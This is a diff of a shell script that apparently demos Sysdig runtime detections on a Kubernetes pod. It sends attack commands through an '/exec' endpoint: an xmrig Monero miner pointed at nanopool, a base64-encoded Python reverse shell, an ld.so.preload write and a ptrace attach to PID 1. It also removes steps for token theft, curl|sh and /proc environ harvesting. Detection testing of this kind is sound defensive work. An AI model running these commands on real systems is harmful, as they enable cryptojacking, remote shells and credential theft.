@@ -128,53 +128,46 @@ echo "---"
 curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig --coin=monero --url=stratum\+tcp://xmr-us-west1.nanopool.org:10343 --user=43NyzPLNUxSXbAgK9szPpvBxXhajTwAT1YEWHU6YAKcpfBuiw4DgH5LNbmPAk5m5A5AAhkbFWGu2PTdC1EoDnwpZEHnVCco -B --tls'
 
 
+# Steps 11-14 below were 11-17 until 2026-08-15. Three were REMOVED because they
+# produce NO Sysdig detection at all, verified live on au1 by attributing every
+# candidate event on proc.cmdline:
+#   old 11  read the ServiceAccount token + call the K8s API
+#           "Read sensitive file untrusted" only ever fired for /etc/shadow, and
+#           "Suspicious Connection to K8S API Server From Container" only for
+#           step 8's kubectl. The tty-dependent SA-token rule cannot match a
+#           payload arriving through the Flask endpoint.
+#   old 13  curl | sh
+#           the payload fetches benign static content, and the rule needs a real
+#           network tool to be executed -- so not firing is CORRECT, not a bug.
+#   old 15  harvest /proc/*/environ
+#           no rule on this tenant watches /proc/*/environ reads.
+# They were real techniques, so removing them trims ATT&CK breadth slightly -- but
+# a demo step that reliably shows nothing is worse than one fewer step. Each also
+# cost a curl plus a 15s sleep. See docs/session-log-2026-08-15.md in
+# bb-eks-runtime-testing for the evidence.
 echo "================================================================================"
-echo " ADDITIONAL RUNTIME-DETECTION TESTS (steps 11-17) — each maps to a Sysdig rule"
+echo " ADDITIONAL RUNTIME-DETECTION TESTS (steps 11-14) — each maps to a Sysdig rule"
 echo "================================================================================"
 
-echo "11. Reading the Kubernetes ServiceAccount token from inside the pod (credential theft, T1528)"
-echo "--------------------------------------------------------------------------------"
-curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo Y2F0IC92YXIvcnVuL3NlY3JldHMva3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC90b2tlbiA+L2Rldi9udWxs | base64 -d | timeout 12 sh'
-echo ""
-echo "--------------------------------------------------------------------------------"
-sleep 15
-
-echo "12. Spawning a Python reverse shell (a /bin/sh wired to a network socket, T1059)"
+echo "11. Spawning a Python reverse shell (a /bin/sh wired to a network socket, T1059)"
 echo "--------------------------------------------------------------------------------"
 curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo ZXhwb3J0IE5TPWBncmVwIG5hbWVzZXJ2ZXIgL2V0Yy9yZXNvbHYuY29uZnxhd2sgJ3twcmludCAkMn0nYApweXRob24zIC1jICJpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnJE5TJyw1MykpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbJy9iaW4vc2gnLCctaSddKSI= | base64 -d | timeout 12 sh'
 echo ""
 echo "--------------------------------------------------------------------------------"
 sleep 15
-
-echo "13. Downloading a remote script and piping it straight to a shell (curl | sh, T1105)"
-echo "--------------------------------------------------------------------------------"
-curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo Y3VybCAtcyAtbTMgaHR0cHM6Ly9leGFtcGxlLmNvbS8gMj4vZGV2L251bGwgfCBzaCAyPi9kZXYvbnVsbAplY2hvICIoc2ltdWxhdGVkIGN1cmwgfCBzaCDigJQgZmV0Y2hlZCBiZW5pZ24gc3RhdGljIGNvbnRlbnQpIg== | base64 -d | timeout 12 sh'
-echo ""
-echo "--------------------------------------------------------------------------------"
-sleep 15
-
-echo "14. Executing a base64-encoded shell script from the command line (defense evasion, T1027)"
+echo "12. Executing a base64-encoded shell script from the command line (defense evasion, T1027)"
 echo "--------------------------------------------------------------------------------"
 curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo c2ggLWMgImVjaG8gJ0l5RXZZbWx1TDNOb0NtVmphRzhnSWtobGJHeHZJU0lLJ3xiYXNlNjQgLWQiID4vZGV2L251bGw= | base64 -d | timeout 12 sh'
 echo ""
 echo "--------------------------------------------------------------------------------"
 sleep 15
-
-echo "15. Harvesting secrets from other processes' /proc/*/environ (credential access, T1552.001)"
-echo "--------------------------------------------------------------------------------"
-curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo Zm9yIGYgaW4gL3Byb2MvMS9lbnZpcm9uIC9wcm9jLzEvY21kbGluZSAvcHJvYy9zZWxmL2Vudmlyb247IGRvCiAgY2F0ICIkZiIgPi9kZXYvbnVsbCAyPiYxCmRvbmUKZWNobyAiICAocmVhZCAvcHJvYy8qL2Vudmlyb24gYW5kIC9wcm9jLyovY21kbGluZSAtLSBjcmVkZW50aWFsLWhhcnZlc3Rpbmcgc2lnbmFsKSI= | base64 -d | timeout 12 sh'
-echo ""
-echo "--------------------------------------------------------------------------------"
-sleep 15
-
-echo "16. Writing /etc/ld.so.preload (rootkit-style preload hijack, T1574.006)"
+echo "13. Writing /etc/ld.so.preload (rootkit-style preload hijack, T1574.006)"
 echo "--------------------------------------------------------------------------------"
 curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo ZWNobyAnJyA+IC9ldGMvbGQuc28ucHJlbG9hZApybSAtZiAvZXRjL2xkLnNvLnByZWxvYWQ= | base64 -d | timeout 12 sh'
 echo ""
 echo "--------------------------------------------------------------------------------"
 sleep 15
-
-echo "17. Injecting into PID 1 via ptrace(PTRACE_ATTACH) — works here thanks to privileged+hostPID (T1055)"
+echo "14. Injecting into PID 1 via ptrace(PTRACE_ATTACH) — works here thanks to privileged+hostPID (T1055)"
 echo "--------------------------------------------------------------------------------"
 curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo cHl0aG9uMyAtYyAiCmltcG9ydCBjdHlwZXMsIG9zCmxpYmMgPSBjdHlwZXMuQ0RMTCgnbGliYy5zby42JywgdXNlX2Vycm5vPVRydWUpClBUUkFDRV9BVFRBQ0ggPSAxNgpyID0gbGliYy5wdHJhY2UoUFRSQUNFX0FUVEFDSCwgMSwgMCwgMCkKcHJpbnQoJ3B0cmFjZShQVFJBQ0VfQVRUQUNILCAxKSAtPicsIHIsICcoRVBFUk0gd2l0aG91dCBDQVBfU1lTX1BUUkFDRSknIGlmIHIgIT0gMCBlbHNlICcoYXR0YWNoZWQpJykKaWYgciA9PSAwOgogICAgbGliYy5wdHJhY2UoMTcsIDEsIDAsIDApICAjIFBUUkFDRV9ERVRBQ0gKIiAyPi9kZXYvbnVsbA== | base64 -d | timeout 12 sh'
 echo ""
